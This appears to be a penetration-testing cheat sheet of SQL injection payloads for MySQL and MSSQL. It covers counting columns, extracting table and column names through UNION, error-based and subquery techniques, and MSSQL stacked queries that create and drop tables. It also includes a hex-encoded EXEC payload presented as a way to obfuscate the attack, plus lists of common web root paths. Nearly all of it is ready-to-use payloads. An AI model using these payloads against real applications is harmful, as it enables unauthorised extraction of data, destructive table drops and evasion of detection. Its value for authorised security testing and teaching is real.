---
author(s):
  - Userware
tags:
  - helpers
  - webapp-pentesting
  - server-side-attack
  - sql-injection
---
# Enumeration

## 01 - Fields Enumeration

### UNION Query Payloads

#### Generic

Increment by determining the number of columns.

```sql
ORDER BY n+1
GROUP BY n+1
```

Using `SELECT` query.

```sql
UNION SELECT NULL, NULL, ... NULL
```

#### MySQL

```sql
-1 UNION SELECT 1 INTO @,@, ... @
```

When the SQL query ends with `LIMIT 1,<INJECTION_POINT>`.

```sql
1 INTO @,@, ... @
```

#### MSSQL

Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

```sql
HAVING 1=1--
```

Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

```sql
GROUP BY username HAVING 1=1--
```

Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

```sql
GROUP BY username, password HAVING 1=1--
```

No Error

```sql
GROUP BY username, password, permission HAVING 1=1--
```

### Error-based Payloads

##### MySQL

```sql
1 AND (SELECT * FROM Users) = 1
```

## DBMS Version

### UNION Enumeration

#### MySQL

```sql
UNION SELECT VERSION(), NULL, ... NULL
```

### Double Injection (SubQuery) Enumeration

#### MySQL

```sql
OR 1=1 IN (SELECT @@VERSION)
AND 1=1 IN (SELECT @@VERSION)
```

## Tables Enumeration

### MySQL

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';
SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';
```

Double Injection (SubQuery) enumeration.

```sql
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5
```

### MSSQL

UNION enumeration.

```sql
UNION SELECT name FROM master..sysobjects WHERE xtype='U'
```

Double Injection (SubQuery) enumeration.

```sql
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
```

## Columns Enumeration

### MySQL

```sql
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

Double Injection (SubQuery) enumeration.

```sql
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5
AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1
AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)
AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)
```

#### Procedure Payloads

Get the first column's name

```sql
1 PROCEDURE ANALYSE()
```

Get the second column's name

```sql
1 LIMIT 1,1 PROCEDURE ANALYSE()
```

Get the third column's name

```sql
1 LIMIT 2,1 PROCEDURE ANALYSE()
```

### MSSQL

UNION enumeration.

```sql
UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')
```

Double Injection (SubQuery) enumeration.

```sql
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))
```

## Retrieving Multiple Tables/Columns at once

### MSSQL

 The following 3 queries will create a temporary table/column and insert all the user-defined tables into it. It will then dump the table content and finish by deleting the table. 

```sql
AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END; 
```

 Dump content.

```sql
AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB); 
```

 Delete Table.

```sql
AND 1=0; DROP TABLE TMP_DB;
```

 An easier method is available starting with MSSQL 2005 and higher. The XML function path() works as a concatenator, allowing the retrieval of all tables with 1 query. 

```sql
SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')
```

> [!NOTE]
>  You can encode your query in hex to "obfuscate" your attack.
>  ```
>   ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);-- 
>  ```

## Current Query

### MySQL

```
SELECT info FROM information_schema.processlist
```

## Calculate Database Size

### MySQL

#### All Databases

Bytes

```sql
SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery

SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery

SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery
```

Kilobytes

```sql
SELECT CONCAT(table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) FROM information_schema.tables GROUP BY table_schema

SELECT CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery

SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery
```

Megabytes

```sql
SELECT CONCAT(table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) FROM information_schema.tables GROUP BY table_schema

SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery

SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery
```

Gigabytes

```sql
SELECT CONCAT(table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) FROM information_schema.tables GROUP BY table_schema

SELECT CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery

SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery
```

#### Current Database

Bytes

```sql
SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery
```

Megabytes

```sql
SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery
```

Gigabytes

```sql
SELECT CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery
```

## Common Web Root Directories

### Linux

```
/var/www/html/
/var/www/
/var/www/htdocs/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/var/apache2/htdocs/
/var/www/nginx-default/
/usr/local/apache2/htdocs/
/usr/local/www/data/
/srv/www/
/srv/www/html/
/srv/www/htdocs/
/srv/www/sites/
/home/www/
/home/httpd/
/home/<username>/public_html/
/home/<username>/www/
```

### Windows

```
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

---
## References

### WebSec

- [WebSec: SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)

### kleiton0x00

- [kleiton0x00: Advanced SQL Injection Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)

### Exploit Database

- [Exploit DB: MySQL Error Based SQL Injection Using EXP](https://www.exploit-db.com/docs/english/37953-mysql-error-based-sql-injection-using-exp.pdf)

- [Exploit DB Papers: Beyond SQLi Obfuscate and Bypass](https://www.exploit-db.com/papers/17934)

### D7X

- [D7X: Web Application & SQL Injection Pen Test cheatsheet by D7X](https://sqli.promiselabs.net/)

### PayloadsAllTheThings

- [PayloadsAllTheThings: SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)

### Pentestlab

- [Pentestlab Blog: SQL Injection Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

### Hacktricks

- [Hacktricks: SQL Login Bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

### Phrack.me

- [Phrack.me: SQL Injection Cheatsheet](https://www.phrack.me/exploits/2020/07/09/SQL-Injection-primer.html)

### SecLists

- [SecLists: Linux Web Root Directories](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)

- [SecLists: Windows Web Root Directories](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

### Sjoerd Langkemper

- [Sjoerd Langkemper: Finding common files in the webroot](https://www.sjoerdlangkemper.nl/2018/05/23/creating-a-dirsearch-list/)